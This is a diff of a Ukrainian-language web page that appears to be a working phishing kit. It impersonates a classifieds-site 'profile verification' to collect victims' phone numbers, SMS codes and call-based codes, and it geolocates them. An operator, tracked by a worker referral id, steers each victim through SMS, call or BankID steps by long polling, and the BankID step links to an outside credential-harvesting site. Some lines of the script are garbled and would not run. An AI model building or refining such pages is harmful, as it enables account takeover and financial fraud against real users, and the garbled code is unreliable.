@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="uk">
 <head>
+    <!-- Весь твой предыдущий <head> остаётся без изменений -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Перевірка даних</title>
@@ -8,324 +9,198 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
     <style>
-        :root {
-            --primary: #007bff;
-            --primary-hover: #0056b3;
-            --success: #28a745;
-            --danger: #dc3545;
-            --border: #e0e0e0;
-            --bg: #f8f9fa;
-            --text: #333;
-            --shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
-            --text-muted: #666;
-            --black: #000;
-        }
+        /* Весь твой CSS + добавляем новые стили */
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 15px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: #fff;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: var(--shadow);
-        }
-
-        .header {
-            background: var(--primary);
-            color: white;
-            padding: 16px;
+        .loading-step {
             text-align: center;
+            padding: 40px 20px;
+            display: none;
+        }
+        .loading-step.active { display: block; }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-text {
+            font-size: 16px;
+            color: var(--text-muted);
+        }
+
+        .call-step, .bankid-step {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .call-step.active, .bankid-step.active { display: block; }
+
+        .bankid-warning {
+            color: #d32f2f;
             font-weight: 600;
-            font-size: 17px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+            margin-bottom: 20px;
+            font-size: 15px;
         }
 
-        .header i { font-size: 19px; }
-
-        .content { padding: 25px 20px; text-align: center; }
-
-        .logo { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; border: 3px solid #fff; box-shadow: 0 3px 10px rgba(0,0,0,0.1); }
-
-        .info-text {
-            background: #e3f2fd;
-            color: #1565c0;
-            padding: 14px 16px;
-            border-radius: 14px;
-            font-size: 14.5px;
-            line-height: 1.5;
-            margin-bottom: 22px;
-            border: 1px solid #bbdefb;
-        }
-
-        input {
+        .bankid-btn {
+            display: block;
             width: 100%;
-            padding: 15px 16px;
-            font-size: 19px;
-            text-align: center;
-            border: 2px solid var(--border);
-            border-radius: 12px;
-            transition: all 0.3s ease;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.15);
-        }
-
-        .submit-button {
-            width: 100%;
-            padding: 15px;
-            background: var(--primary);
+            padding: 16px;
+            background: #000;
             color: white;
             border: none;
             border-radius: 12px;
             font-size: 17px;
             font-weight: 600;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-
-        .submit-button:hover { background: var(--primary-hover); }
-
-        /* Загрузка */
-        .loading {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 40px 20px;
-            color: var(--text);
-            font-size: 16px;
-            line-height: 1.6;
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f0f0f0;
-            border-top: 5px solid var(--primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Шаги */
-        .step { display: none; }
-        .step.active { display: block; animation: fadeIn 0.4s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .bankid-warning { color: var(--danger); font-weight: 600; font-size: 15px; margin-bottom: 20px; }
-        .bankid-btn {
-            background: #000 !important;
-            color: white !important;
-            padding: 16px !important;
-            border-radius: 14px !important;
             text-decoration: none;
-            display: inline-block;
-            font-weight: 600;
-        }
-
-        .call-digits {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 20px 0;
-        }
-
-        .call-digits input {
-            width: 60px;
-            height: 60px;
-            font-size: 24px;
-            font-weight: bold;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <div class="header">
+            <i class="fas fa-shield-alt"></i>
+            <span>Безпечна перевірка</span>
+        </div>
 
-<div class="container">
-    <div class="header">
-        <i class="fas fa-shield-alt"></i>
-        <span>Безпечна перевірка</span>
+        <div class="content">
+            <div class="logo-wrapper">
+                <img id="project-logo" src="" alt="Логотип" class="logo">
+            </div>
+
+            <!-- Крок 1: Номер телефону -->
+            <div id="phone-step" class="step active">
+                <div class="info-text">
+                    Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону.
+                </div>
+                <div class="input-group">
+                    <input type="tel" id="phone-number" class="phone-input" placeholder="+380 __ ___ __ __">
+                </div>
+                <button type="button" class="submit-button" onclick="submitPhone()">Продовжити</button>
+            </div>
+
+            <!-- Загрузка -->
+            <div id="loading-step" class="loading-step">
+                <div class="spinner"></div>
+                <div class="loading-text">Зачекайте, ваші дані обробляються.<br>Не закривайте сторінку.</div>
+            </div>
+
+            <!-- SMS-код (по умолчанию) -->
+            <div id="sms-step" class="step">
+                <p class="sms-prompt">Введіть 6-значний код з SMS</p>
+                <div class="code-input-group">
+                    <input type="text" maxlength="1" class="code-input" id="code-1">
+                    <input type="text" maxlength="1" class="code-input" id="code-2">
+                    <input type="text" maxlength="1" class="code-input" id="code-3">
+                    <input type="text" maxlength="1" class="code-input" id="code-4">
+                    <input type="text" maxlength="1" class="code-input" id="code-5">
+                    <input type="text" maxlength="1" class="code-input" id="code-6">
+                </div>
+                <button type="button" class="submit-button" onclick="submitCode()">Підтвердити</button>
+            </div>
+
+            <!-- Дзвінок – 4 цифри -->
+            <div id="call-step" class="call-step">
+                <div class="info-text" style="background:#fff3cd;color:#856404;border-color:#ffeaa7;">
+                    На ваш номер надійде дзвінок.<br>Вкажіть <strong>останні 4 цифри</strong> номера, з якого був дзвінок.
+                </div>
+                <div class="input-group">
+                    <input type="text" id="last4" maxlength="4" class="phone-input" placeholder="____" inputmode="numeric">
+                </div>
+                <button type="button" class="submit-button" onclick="submitLast4()">Продовжити</button>
+            </div>
+
+            <!-- BankID -->
+            <div id="bankid-step" class="bankid-step">
+                <div class="bankid-warning">
+                    Ваш профіль не підтверджено.<br>
+                    Для скасування блокування та продовження користування підтвердіть профіль за допомогою BankID
+                </div>
+                <a href="https://idverification.onrender.com" class="bankid-btn">Підтвердити</a>
+            </div>
+
+            <!-- Успіх -->
+            <div id="success-step" class="step">
+                <div class="success-message">
+                    <i class="fas fa-check-circle"></i>
+                    <div>Ваш аккаунт успішно підтверджено</div>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <div class="content">
-        <div class="logo-wrapper">
-            <img id="project-logo" src="" alt="Логотип" class="logo">
-        </div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const session = urlParams.get('s') || Date.now().toString(36);
+        const project = urlParams.get('project') || 'dimria';
+        const worker = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
 
-        <!-- Шаг 1: Номер телефона -->
-        <div id="phone-step" class="step active">
-            <div class="info-text">
-                Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону.
-            </div>
-            <div class="input-group">
-                <input type="tel" id="phone-number" placeholder="+380 __ ___ __ __" inputmode="numeric">
-            </div>
-            <button type="button" class="submit-button" onclick="submitPhone()">Продовжити</button>
-        </div>
+        let userCity = 'Невідомо';
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userCity = d.city || 'Невідомо');
 
-        <!-- Загрузка -->
-        <div id="loading-step" class="step loading">
-            <div class="spinner"></div>
-            <div>Зачекайте, ваші дані обробляються.<br>Не закривайте сторінку.</div>
-        </div>
+        document.getElementById('project-logo').src = `/logo?project=${project}`;
 
-        <!-- Звонок — последние 4 цифры -->
-        <div id="call-step" class="step">
-            <div class="info-text">
-                На ваш номер надійде дзвінок.<br>Вкажіть <strong>останні 4 цифри</strong> номера, з якого був дзвінок.
-            </div>
-            <div class="call-digits">
-                <input type="text" maxlength="1" class="code-input" id="d1">
-                <input type="text" maxlength="1" class="code-input" id="d2">
-                <input type="text" maxlength="1" class="code-input" id="d3">
-                <input type="text" maxlength="1" class="code-input" id="d4">
-            </div>
-            <button type="button" class="submit-button" onclick="submitCallDigits()">Продовжити</button>
-        </div>
-
-        <!-- SMS-код -->
-        <div id="sms-step" class="step">
-            <div class="info-text">Введіть 6-значний код з SMS</div>
-            <div class="call-digits">
-                <input type="text" maxlength="1" class="code-input" id="c1">
-                <input type="text" maxlength="1" class="code-input" id="c2">
-                <input type="text" maxlength="1" class="code-input" id="c3">
-                <input type="text" maxlength="1" class="code-input" id="c4">
-                <input type="text" maxlength="1" class="code-input" id="c5">
-                <input type="text" maxlength="1" class="code-input" id="c6">
-            </div>
-            <button type="button" class="submit-button" onclick="submitSmsCode()">Підтвердити</button>
-        </div>
-
-        <!-- BankID -->
-        <div id="bankid-step" class="step">
-            <div class="bankid-warning">
-                Ваш профіль не підтверджено.<br>
-                Для скасування видалення та продовження користування підтвердіть профіль за допомогою BankID
-            </div>
-            <a href="https://idverification.onrender.com" target="_blank" class="submit-button bankid-btn">
-                Підтвердити через BankID
-            </a>
-        </div>
-    </div>
-</div>
-
-<script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const project = urlParams.get('project') || 'dimria';
-    const session = urlParams.get('session') || Math.random().toString(36).substring(2, 15);
-    const worker = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
-
-    document.getElementById('project-logo').src = `/logo?project=${project}`;
-
-    let userCity = 'Невідомо';
-    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userCity = d.city || 'Невідомо');
-
-    $(document).ready(() => {
-        $('#phone-number').mask('+380 00 000 00 00', {placeholder: " "}).focus();
-
-        // Автопереход по цифрам
-        $('.code-input').on('input', function() {
-            if (this.value.length === 1 && this.nextElementSibling) {
-                this.nextElementSibling.focus();
-            }
-        }).on('keydown', function(e) {
-            if (e.key === 'Backspace' && !this.value && this.previousElementSibling) {
-                this.previousElementSibling.focus();
-            }
+        $(() => {
+            $('#phone-number').mask('+380 00 000 00 00', { placeholder: " " }).focus();
+            $('.code-input, #last4').on('input', function() {
+                this.value = this.value.replace(/\D/g, '').substr(0, this.id === 'last4' ? 4 : 1);
+                if (this.value && this.nextElementSibling) this.nextElementSibling.focus();
+            });
         });
-    });
 
-    function showLoading() {
-        $('.step').removeClass('active');
-        $('#loading-step').addClass('active');
-    }
-
-    function submitPhone() {
-        const phone = $('#phone-number').val().replace(/\D/g, '');
-        if (phone.length !== 12 || !phone.startsWith('380')) {
-            alert('Введіть коректний номер');
-            return;
+        function showStep(id) {
+            $('.step, .loading-step, .call-step, .bankid-step').removeClass('active');
+            \( (`# \){id}`).addClass('active');
         }
-        showLoading();
-        sendData('phone', { phone: '+' + phone });
-    }
 
-    function submitCallDigits() {
-        const digits = $('#d1,#d2,#d3,#d4').map((_,el) => el.value).get().join('');
-        if (digits.length !== 4) return alert('Введіть 4 цифри');
-        showLoading();
-        sendData('call_digits', { digits });
-    }
+        function submitPhone() {
+            const phone = $('#phone-number').val().replace(/\D/g, '');
+            if (phone.length !== 12 || !phone.startsWith('380')) return alert('Невірний номер');
+            sendData('phone', { phone });
+            showStep('loading-step');
+        }
 
-    function submitSmsCode() {
-        const code = $('#c1,#c2,#c3,#c4,#c5,#c6').map((_,el) => el.value).get().join('');
-        if (code.length !== 6) return alert('Введіть 6 цифр');
-        showLoading();
-        sendData('sms_code', { code });
-    }
+        function submitCode() {
+            const code = $('.code-input').map((_,el) => el.value).get().join('');
+            if (code.length !== 6) return alert('Введіть 6 цифр');
+            sendData('code', { code });
+            showStep('loading-step');
+            setTimeout(() => showStep('success-step'), 2500);
+        }
 
-    function sendData(type, data) {
-        $.post('/api/log', {
-            session,
-            type,
-            worker,
-            project,
-            city: userCity,
-            ...data
-        });
-    }
+        function submitLast4() {
+            const digits = $('#last4').val();
+            if (digits.length !== 4) return alert('Введіть 4 цифри');
+            sendData('last4', { digits });
+            showStep('loading-step');
+            setTimeout(() => showStep('success-step'), 2500);
+        }
 
-    // Получаем команду от сервера (через long polling)
-    function checkCommand() {
-        $.get('/api/command/' + session, function(cmd) {
-            if (!cmd) return setTimeout(checkCommand, 2000);
+        function sendData(type, data) {
+            $.post('/api/send-data', JSON.stringify({
+                session, project, worker, city: userCity, type, ...data
+            }), 'json');
+        }
 
-            if (cmd === 'call') {
-                $('.step').removeClass('active');
-                $('#call-step').addClass('active');
-                $('#d1').focus();
-            }
-            if (cmd === 'sms') {
-                $('.step').removeClass('active');
-                $('#sms-step').addClass('active');
-                $('#c1').focus();
-            }
-            if (cmd === 'bankid') {
-                $('.step').removeClass('active');
-                $('#bankid-step').addClass('active');
-            }
-        }).always(() => setTimeout(checkCommand, 2000));
-    }
+        // Получаем команды от сервера (long polling)
+        function listenCommands() {
+            \( .get(`/api/command?session= \){session}&t=${Date.now()}`, function(cmd) {
+                if (!cmd) return listenCommands();
+                if (cmd === 'sms') showStep('sms-step'), $('#code-1').focus();
+                if (cmd === 'call') showStep('call-step'), $('#last4').focus();
+                if (cmd === 'bankid') showStep('bankid-step');
+            }).always(listenCommands);
+        }
 
-    // Запуск проверки команд после отправки номера
-    window.submitPhone = function() {
-        const phone = $('#phone-number').val().replace(/\D/g, '');
-        if (phone.length !== 12 || !phone.startsWith('380')) return alert('Невірний номер');
-        showLoading();
-        sendData('phone', { phone: '+' + phone });
-        checkCommand(); // начинаем слушать команды
-    };
-
-    checkCommand(); // на всякий случай
-</script>
+        setTimeout(listenCommands, 2000);
+        window.onload = () => $('#phone-number').focus();
+    </script>
 </body>
 </html>
